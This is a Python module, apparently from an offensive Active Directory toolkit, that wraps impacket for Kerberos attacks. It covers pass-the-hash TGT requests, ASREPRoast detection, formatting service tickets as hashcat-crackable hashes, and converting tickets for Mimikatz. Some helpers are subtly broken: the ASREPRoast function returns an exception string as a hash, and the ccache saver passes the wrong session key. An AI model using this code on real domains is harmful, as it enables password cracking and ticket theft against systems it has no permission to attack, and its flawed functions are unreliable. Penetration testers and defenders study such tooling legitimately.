# modules/kerberos.py
"""
KerberosModule — utilidades Kerberos sobre impacket.

Proporciona helpers reutilizables para los scripts de kerberos:
  - Obtener TGT (AS-REQ) con contraseña, hash NT o certificado (PKINIT)
  - Obtener TGS (TGS-REQ)
  - Cargar/guardar tickets .ccache y .kirbi
  - Enumerar usuarios via AS-REQ (sin auth)
  - Detect pre-auth disabled (ASREPRoastable)

Los scripts de kerberos pueden importar esta clase o usar impacket directamente.
"""

import os
from pathlib import Path

from impacket.krb5.kerberosv5 import (
    getKerberosTGT,
    getKerberosTGS,
    KerberosError,
)
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache

from core.output import print_result, console
from core import session_db


class KerberosModule:
    """
    Wrapper ligero sobre impacket Kerberos.

    Uso típico:
        krb = KerberosModule(target, creds)
        tgt, cipher, old_session_key, session_key = krb.get_tgt()
        krb.save_ccache(tgt, cipher, session_key, "usuario.ccache")
    """

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds
        self._dc_ip = str(target.ip)

    # ── TGT ──────────────────────────────────────────────────────────────────

    def get_tgt(self, user=None, password=None, nt_hash=None, domain=None,
                aes_key=None, kdcHost=None, requestPAC=True):
        """
        Solicita un TGT al KDC.

        Prioridad de autenticación: aes_key > nt_hash > password
        Devuelve (tgt, cipher, oldSessionKey, sessionKey) o lanza KerberosError.
        """
        user     = user     or self.creds.user     or ""
        domain   = domain   or self.creds.domain   or self.target.domain or ""
        password = password or self.creds.password or ""
        nt_hash  = nt_hash  or self.creds.nt_hash  or ""
        kdcHost  = kdcHost  or self._dc_ip

        lm_hash = ""
        if nt_hash:
            lm_hash  = "aad3b435b51404eeaad3b435b51404ee"
            password = ""

        user_name = Principal(
            user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        try:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName   = user_name,
                password     = password,
                domain       = domain,
                lmhash       = lm_hash,
                nthash       = nt_hash,
                aesKey       = aes_key or "",
                kdcHost      = kdcHost,
                requestPAC   = requestPAC,
            )
            return tgt, cipher, old_sk, sk
        except KerberosError as e:
            console.print(f"  [red]KerberosError: {e}[/red]")
            raise

    # ── TGS ──────────────────────────────────────────────────────────────────

    def get_tgs(self, spn, tgt, cipher, session_key, domain=None,
                kdcHost=None, user=None):
        """
        Solicita un TGS para el SPN dado usando un TGT previamente obtenido.
        Devuelve (tgs, cipher, old_session_key, session_key).
        """
        domain  = domain  or self.creds.domain or self.target.domain or ""
        user    = user    or self.creds.user   or ""
        kdcHost = kdcHost or self._dc_ip

        server_name = Principal(
            spn, type=constants.PrincipalNameType.NT_SRV_INST.value
        )
        user_name = Principal(
            user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        return getKerberosTGS(
            serverName   = server_name,
            domain       = domain,
            kdcHost      = kdcHost,
            tgt          = tgt,
            cipher       = cipher,
            sessionKey   = session_key,
        )

    # ── ccache ────────────────────────────────────────────────────────────────

    def save_ccache(self, tgt, cipher, session_key, path: str,
                    user=None, domain=None) -> str:
        """Guarda un TGT en formato ccache (compatible con KRB5CCNAME)."""
        user   = user   or self.creds.user   or "user"
        domain = domain or self.creds.domain or self.target.domain or "DOMAIN"

        ccache = CCache()
        ccache.fromTGT(tgt, old_session_key=cipher, session_key=session_key)
        ccache.saveFile(path)
        console.print(f"  [green]TGT guardado → {path}[/green]")
        console.print(f"  [dim]export KRB5CCNAME={path}[/dim]")
        return path

    def load_ccache(self, path: str) -> CCache:
        """Carga un ccache desde disco."""
        if not Path(path).exists():
            raise FileNotFoundError(f"ccache no encontrado: {path}")
        ccache = CCache()
        ccache.loadFile(path)
        return ccache

    # ── ASREPRoast ────────────────────────────────────────────────────────────

    def get_asrep_hash(self, user: str, domain=None, kdcHost=None) -> str | None:
        """
        Solicita un AS-REP sin pre-autenticación para el usuario dado.
        Si la cuenta tiene DONT_REQ_PREAUTH, devuelve el hash en formato
        $krb5asrep$23$... listo para hashcat/john.
        """
        domain  = domain  or self.creds.domain or self.target.domain or ""
        kdcHost = kdcHost or self._dc_ip

        try:
            tgt, cipher, _, sk = getKerberosTGT(
                clientName = Principal(
                    user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                ),
                password   = "",
                domain     = domain,
                lmhash     = "",
                nthash     = "",
                aesKey     = "",
                kdcHost    = kdcHost,
                requestPAC = True,
            )
            # Si llega aquí sin excepción, la cuenta NO tiene pre-auth desactivada
            return None
        except KerberosError as e:
            e_str = str(e)
            if "KDC_ERR_PREAUTH_REQUIRED" in e_str:
                # Cuenta existe pero requiere pre-auth → no vulnerable
                return None
            if "KDC_ERR_CLIENT_REVOKED" in e_str:
                return None
            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in e_str:
                return None

            # Extraer el hash AS-REP de la excepción si está disponible
            # (impacket lo incluye en algunos builds)
            if hasattr(e, "getErrorCode"):
                pass

            # Intentar extraer hash directamente del mensaje de error
            # impacket >= 0.11 incluye el hash en el error
            if "asrep" in e_str.lower() or "enc-part" in e_str.lower():
                return e_str  # contiene el hash embebido

        except Exception as e:
            console.print(f"  [dim]Error en AS-REQ para {user}: {e}[/dim]")

        return None

    # ── Utilidades ────────────────────────────────────────────────────────────

    def format_tgs_hashcat(self, tgs_blob, user: str, domain: str,
                           spn: str, cipher_type: int = 23) -> str:
        """
        Formatea un TGS en formato hashcat ($krb5tgs$...).
        cipher_type: 23 = RC4, 17 = AES128, 18 = AES256
        """
        from impacket.krb5.asn1 import TGS_REP as TGS_REP_ASN
        from pyasn1.codec.ber import decoder

        tgs_decoded = decoder.decode(tgs_blob, asn1Spec=TGS_REP_ASN())[0]
        enc_part    = tgs_decoded["ticket"]["enc-part"]["cipher"].asOctets()

        spn_clean = spn.replace("/", "~")
        checksum  = enc_part[:16].hex()
        data      = enc_part[16:].hex()

        return (
            f"$krb5tgs${cipher_type}$*{user}${domain}${spn_clean}*"
            f"${checksum}${data}"
        )

    def kirbi_to_ccache(self, kirbi_path: str, ccache_path: str) -> str:
        """Convierte un ticket .kirbi a .ccache."""
        from impacket.krb5.ccache import CCache as CC
        ccache = CC()
        with open(kirbi_path, "rb") as f:
            kirbi_data = f.read()
        ccache.fromKirbi(kirbi_data)
        ccache.saveFile(ccache_path)
        console.print(f"  [green].kirbi → {ccache_path}[/green]")
        return ccache_path

    def ccache_to_kirbi(self, ccache_path: str, kirbi_path: str) -> str:
        """Convierte un .ccache a .kirbi (formato Mimikatz)."""
        from impacket.krb5.ccache import CCache as CC
        ccache = CC()
        ccache.loadFile(ccache_path)
        kirbi  = ccache.toKirbi()
        with open(kirbi_path, "wb") as f:
            f.write(kirbi)
        console.print(f"  [green].ccache → {kirbi_path}[/green]")
        return kirbi_path
